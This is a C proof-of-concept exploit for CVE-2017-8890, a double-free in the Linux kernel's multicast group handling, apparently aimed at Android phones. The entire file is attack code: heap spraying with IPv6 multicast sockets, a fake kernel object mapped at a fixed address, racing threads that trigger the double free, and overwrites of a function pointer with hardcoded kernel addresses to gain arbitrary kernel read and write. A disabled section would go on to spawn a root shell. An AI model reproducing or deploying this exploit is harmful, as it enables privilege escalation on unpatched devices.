/*
 * CVE-2017-8890
 * This is a dobule free vulnerability found by Pray3r using syzkaller from TYA.
 * I exploited it on android phone, and dosen't publish it entirely.
 * But I'm sure that you will know how does it work and make it to root priv. :p
 * If you have any question or cooperation, wellcome to connect with me.
 * 
 * Demo
 * https://asciinema.org/a/MQbN4U1yB2LedJp2tZzjKGUfO
 *
 * Jeremy Huang (jeremyhcw@gmail.com)
 * https://twitter.com/bittorrent3389
 * 
 *
 * -> entry_SYSCALL_64_fastpath() -> SyS_setsockopt() -> SYSC_setsockopt() -> sock_common_setsockopt() -> tcp_setsockopt() -> ip_setsockopt() -> do_ip_setsockopt() -> do_ip_setsockopt() -> ip_mc_join_group() -> sock_kmalloc() -> [...]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <err.h>
#include <errno.h>
#include <pthread.h>
#include <errno.h>
#include <semaphore.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/prctl.h>

#include "utils.h"
#include "one_igmp.h"
#define PORT 45555
#define children_num 7
#define defrag_num 60
#define real_spray 1
#define FORKCHILD 1
#define fake_next_rcu (0x0c000000) //struct ip_mc_socklist __rcu *next_rcu;
int cpu_num;
struct sockaddr_in serv_addr = {};
sem_t sem;
struct group_req gr_spray = {};
struct sockaddr_in6 in6_spray = {};
int ipv6_fd[1024] = {};
int ipv6_fd_500[500] = {};
int conntfd[2] = {};
/* cpu imformation */
int cpuid = 0;
cpu_set_t mask;
//
bool server_init=false;
bool server_finish=false;
bool client_finish=false;
//
int line, child[8] = {};
pthread_t detect_t;
int bind_cpu_on(int);
static void init_fake_obj(void);
extern int break_kptr_restrict(void);
int getpid(void) {
    return syscall(178);
}
int getcpu(unsigned *cpu, unsigned *a, void *b)
{
    return syscall(__NR_getcpu, &cpu, NULL, NULL);
}

#define spray_times 500 /* spray for the hole. */
static int count = 0;

static int create_socket_spray(int c)
{
    unsigned i;
    for ( i = 0; i < c ; i++ ) {
        if ((ipv6_fd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
            return i - 1 ;
        }
    }
    return i;
}

static int prepare_spray_obj(int fd,
    struct group_req* gr_spray_ptr, 
    struct sockaddr_in6* in6_spray_ptr, unsigned c)
{
    gr_spray_ptr->gr_interface = 1;
    
    in6_spray_ptr->sin6_family = AF_INET6;
    int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00";
    *(unsigned*)&addr[8] = c;
    memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof addr);
    memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
#if 0
    hexdump(gr_spray, sizeof(*gr_spray));
#endif
    return setsockopt(fd, SOL_IPV6, 0x2a, gr_spray_ptr, sizeof(*gr_spray_ptr));
}

static void init_fake_obj(void)
{

    if ( mmap((void*)fake_next_rcu, 4096, PROT_READ|PROT_WRITE, 
         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
         err(-1, "mmap at %p failed.", (void*) fake_next_rcu);

    struct ip_mc_socklist *iml = (void*)(fake_next_rcu+0xff);
    struct socket *fake_sock = (void*)&iml->rcu.next; 
    // this will be 1st arg for kernel_scok_ioctl().

    printf("[+] %s(), fake_sock : %p\n", __func__, fake_sock);
    *(size_t*)((char*)fake_sock + 0x28 ) = (size_t) fake_sock + 0x100;
    *(size_t*)((char*)fake_sock + 0x148 ) = 0xffffffc000d8948c; // kernel_sock_ioctl_ret;

    iml->rcu.next = (void*) NULL;
    iml->rcu.func = (void*) NULL;

	printf("[*] iml : %p, &(iml->rcu.next) : %p\n", (void*)iml, &(iml->rcu.next) );

}

void *detect_fn(void*arg)
{
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    struct rcu_head* head = (void*)(fake_next_rcu + 0x11f);
    printf("[!] %s, original value head: %p\n", __func__, head);

    while ( 1 ) {
    	if ( head->next ) {
    		head->func = (void*)0xffffffc000d89438;
    		break;
    	}
    }

    printf("[!] fake_next_rcu was modified to : head->next : %p, head->func : %p\n", 
            head->next, head->func);
    return NULL;
}

static int prepare()
{
    int x, cnt, times, fd, ret, i = ret = times = fd = x = 0;

    printf("[+] %s(), Create spray socket fd ... %d\n", __func__, spray_times);
    int c;
    for ( c = 0 ; c < spray_times ; c++ ) {
        if ((ipv6_fd_500[c] = 
             socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
        }
    }

    printf("[+] %s(), Create defrag spray socket fd ... %d\n", __func__, defrag_num);
    if ( defrag_num == (x = create_socket_spray(defrag_num) )) {
        printf("[+] create_socket_spray done. create # of socket : %d.\n", x);
    }
    else {
        line = __LINE__;
        goto error;
    }

    if(pthread_create(&detect_t, NULL, detect_fn, NULL))
        err(-1, "[-] %s() line: %d, detect_t. ", __func__,__LINE__);

    cnt = 30;
    printf("[+] starting spray fd : %d\n", ipv6_fd[0]);

    for ( i = 0 ; i < cnt ; i++, times = 0 )
        while((ret=prepare_spray_obj(ipv6_fd[i], &gr_spray, &in6_spray, times++)) == 0); 

    printf("[+] spray ipv6 obj(30 times) done, not yet close...\n");

    printf("%s() done.\n", __func__);
    int new_cpuid = cpuid;
    printf("%s(), cpuid : %d, now_cpuid : %d\n", __func__,cpuid, new_cpuid);

    puts("bind_cpu_on(7)");
    for(i =0 ; i < 10000 ;i++) {
        bind_cpu_on(new_cpuid);
    }
    bind_cpu_on(new_cpuid);
    cpuid = new_cpuid;
    printf("[!] Target is on cpu %d\n", cpuid);
    
    return 0;

error:
    printf("[-] error line: %d\n", line);
    return -1; 
}

void *free_fn(void *arg)
{
    int sockfd, i;

    struct sockaddr_in s = { 
        .sin_family = AF_INET, 
        .sin_port = htons(PORT),
        .sin_addr = inet_addr("127.0.0.1"),
    };
    printf("[+] %s()\n", __func__);
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    while(!server_init)
        usleep(1);
    // nanosleep({tv_sec=0, tv_nsec=1000}, NULL) = 0  
#define connect_times 2
    for ( i = 0 ; i < connect_times ; i++ )//while(1)
    {
        sockfd = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP);

        //printf("%s(), sockfd : %d\n", __func__, sockfd);
        if (connect(sockfd, (struct sockaddr*)&s, sizeof s ) == 0 ) {
            printf("[+] %d-th client connected successfully...\n", i);
            if ( close(sockfd) != 0 )
                err(-1, "%s(), close(sockfd)\n", __func__);
            
            client_finish=true;
        }    
    }   
    pthread_exit(0);
}

int ser_sockfd;

void *alloc_fn(void *arg)
{
    struct group_req req;
    int ret, i;         // file descriptor for socket
    struct sockaddr_in gg = { 
        .sin_family = AF_INET, 
        .sin_port = htons(PORT),
        .sin_addr = inet_addr("224.0.0.0"), // multicast address
    };
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    ser_sockfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);

    req.gr_interface = 1;
    memcpy(&req.gr_group, &gg, sizeof gg);

    if (setsockopt(ser_sockfd, SOL_IP, MCAST_JOIN_GROUP, &req, sizeof req) == -1)
        warn("setsockopt(SO_REUSEADDR)");

    bind(ser_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    listen(ser_sockfd, 2);
    
    pthread_t free1_t;
    // Create a client thread to connect.
    if ( pthread_create(&free1_t, NULL, free_fn, NULL))
        err(1, "free1_t");

    server_init = true;

    int addr_len = sizeof serv_addr;
#define accept_times 2
    for ( i = 0 ; i < accept_times ; i++ )
    {
        conntfd[i] = accept4(ser_sockfd, NULL, NULL, 0);
        
        if ( conntfd[i] >= 0 ) 
                printf("[+] %d-th accept() has have executed...\n", i);
        else 
            err(-1, "accept");
    }   
    while ( client_finish == false );
    server_finish=true;

    int c, times = 0;
    for ( c = 0 ; c < 30 ; c++, times = 0 ) {  
        while(prepare_spray_obj(
                    ipv6_fd[c], 
                    &gr_spray, 
                    &in6_spray, 
                    times++) == 0
        );
    }
    bind_cpu_on(cpuid);
    bind_cpu_on(cpuid);

    // close (conntfd[0]) cause by accept4()
    // Trigger kernel after defrag spray.
    if ( conntfd[0] ) 
        close(conntfd[0]);
    else 
        err(-1, "close(conntfd[0])");

    for ( c = 0 ; c < defrag_num ; c++ ) {
       if ( close(ipv6_fd[c]) != 0) 
               err(-1, "close(ipv6_fd[%d] = %d)", c, ipv6_fd[c]);
    }
    
#if real_spray
    
    for ( c = 0 ; c < spray_times ; c++, times = 0 ) {
        while(prepare_spray_obj(
            ipv6_fd_500[c],
            &gr_spray,
            &in6_spray,
            times++) == 0
        );
    }
    printf("[*] spray for the hole... %d times\n", spray_times);
#endif 
    return NULL;

}

static int trigger()
{
    pthread_t alloc_t, free1_t, free2_t;
    int sockfd;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    int i, times = 1;

    alloc_fn(NULL);

    bind_cpu_on(cpuid);
    printf("[+] Current cpu : %d After triggered and sprayed 500 times.\n", cpuid);
#if FORKCHILD
    printf("[*] kill chilren by fork()?\n");
    for ( i = 0 ; i < children_num ; i++ )
    {
        printf("kill pid : %d\n", child[i]);
        kill(child[i], SIGKILL);
    }
    wait(NULL);
#endif 

    printf("[+] All killed\n");

    return 0;
}
int bind_cpu_on(int cpuid) 
{
    int i,now_cpuid = -1;
    /*
    if ( cpuid > sysconf(_SC_NPROCESSORS_CONF) -1 )
        err(-1,"cpuid is over...");
    */
    cpu_set_t get;
    CPU_ZERO(&mask);
    CPU_SET(cpuid, &mask);
    if (cpuid == 7)
        return sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);

    while( cpuid != now_cpuid ) {
        sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);
        now_cpuid = sched_getcpu();
    }
    return now_cpuid;
}

static void keep_spraying(int c)
{
    int sockfd[500] = {};
    unsigned i = 0, times, ret;
    for ( ; i < c ; i++ ) {
        if ((sockfd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
        }
    }
    
    for ( i = 0 ; i < c ; i++, times = 0 ) 
        while((ret=prepare_spray_obj(sockfd[i], &gr_spray, &in6_spray, times++)) == 0);

    // at keep_spraying()
    for ( i = 0 ; i < c ; i++ ) 
        close(sockfd[i]);
    printf("%s(%d) done.\n",__func__ , c);
    bind_cpu_on(cpuid);

    printf("[*] %s(), prepare close(conntfd[1]) : %d \n", __func__, conntfd[1]);

    if ( accept_times != 1 )
        ret = close(conntfd[1]);
    else if ( ret != 0 )
        err(-1, "close(conntfd[1])");

    struct rcu_head* head = (void*)(fake_next_rcu+0x11f);
    for(;;) {
    	close(dup(0));
    	if ( head->next ) {
    		head->func = (void*)0xffffffc000d89438; // kernel_sock_ioctl
    		break;
    	}
    }
    printf("head->next : %p\n", head->next);

}

int main(int argc, char *argv[])
{
    cpu_num = sysconf(_SC_NPROCESSORS_CONF);
    setbuf(stdout, NULL);  
    printf("CVE-2017-8890 exploit. cpu_num : %d\n", cpu_num);
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());
#if FORKCHILD   
    int x;
    for ( x = 0; x < children_num ; x++ ) 
    {
        if ( (child[x] = fork() ) == 0 ) {
            printf("I'm child : %d\n", x);
            while(time((time_t*)NULL));
        }   
    }  
#endif
    init_fake_obj();
    cpuid = sched_getcpu();

    if (prepare() < 0 )
        err(-1,"prepare failed..");

    if (trigger() < 0 )
        err(-1, "trigger failed...");
    keep_spraying(100);
    
    char tester[8] = {};
    for (;;) {
        if (!read_at_address_pipe((void*)0xFFFFFFC000080000LL, &tester, 4)) {
            printf("Turn UAF to arbitrary read/write succeeded.\n");
            break;
        }   
    }

#if 0
    printf("[!] we're trying to find ksyms firstly.\n");
    if ( 1 != break_kptr_restrict() )
        err(-1, "ksym not found.");

    init_task = (size_t)get_kallsym_address("init_task", NULL);

    printf("init_task : %p\n", (void*)init_task);
    found_tsk_by_swapper(init_task);  /* in post_exp.c */

    system("/system/bin/sh");
    while(1);
#endif
    return 0;
}
